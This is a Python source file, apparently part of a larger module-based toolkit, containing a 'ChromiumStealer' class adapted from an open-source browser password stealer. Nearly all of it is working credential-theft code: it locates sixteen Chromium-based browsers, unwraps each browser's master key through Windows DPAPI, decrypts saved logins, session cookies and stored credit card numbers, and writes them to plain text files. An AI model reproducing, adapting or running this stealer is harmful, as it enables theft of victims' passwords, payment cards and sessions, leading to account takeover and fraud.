"""
This is a modified version of:
    https://github.com/henry-richard7/Browser-password-stealer/blob/master/chromium_based_browsers.py

--------------------------------------------------------------------------------------
MIT License

Copyright (c) 2020 Henry Richard J

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""



import os
import json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
from datetime import datetime

from config.manager import ModuleManager
from config.constants import Constant
class ChromiumStealer(ModuleManager):
    
    def __init__(self) -> None:
        super().__init__(module_name="ChromiumStealer")

        appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

    def get_master_key(self, path: str):
        if not os.path.exists(path):
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
            if 'os_crypt' not in c:
                return
            
            local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass


    def save_results(self, browser_name, data_type, content):
        if not os.path.exists(browser_name):
            os.mkdir(browser_name)
        if content is not None:
            open(f'{browser_name}/{data_type}.txt', 'w').write(content)
            print(f"\t [*] Saved in {browser_name}/{data_type}.txt")
        else:
            print(f"\t [-] No Data Found!")


    def get_login_data(self, path: str, profile: str, master_key):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return
        result = ""
        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = self.decrypt_password(row[2], master_key)
            result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
            result += Constant.seperator
            
        conn.close()
        return result


    def get_credit_cards(self, path: str, profile: str, master_key):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return
        result = ""
        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            
            card_number = self.decrypt_password(row[3], master_key)
            result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
            result += Constant.seperator
            
        conn.close()
        return result


    def get_cookies(self, path: str, profile: str, master_key):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return
        result = ""
        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], master_key)
            result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
            result += Constant.seperator

        conn.close()
        return result


    def installed_browsers(self):
        results = []
        for browser, path in self.browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results
    
    def run(self):
        available_browsers = self.installed_browsers()
        for browser in available_browsers:
            browser_path = self.browsers[browser]
            master_key = self.get_master_key(browser_path)
            print(f"Getting Stored Details from {browser}")

            print("\t [!] Getting Saved Passwords")
            self.save_results(browser, 'Saved_Passwords', self.get_login_data(browser_path, "Default", master_key))
            print("\t------\n")

            print("\t [!] Getting Cookies")
            self.save_results(browser, 'Browser_Cookies', self.get_cookies(browser_path, "Default", master_key))
            print("\t------\n")

            print("\t [!] Getting Saved Credit Cards")
            self.save_results(browser, 'Saved_Credit_Cards', self.get_credit_cards(browser_path, "Default", master_key))


    
        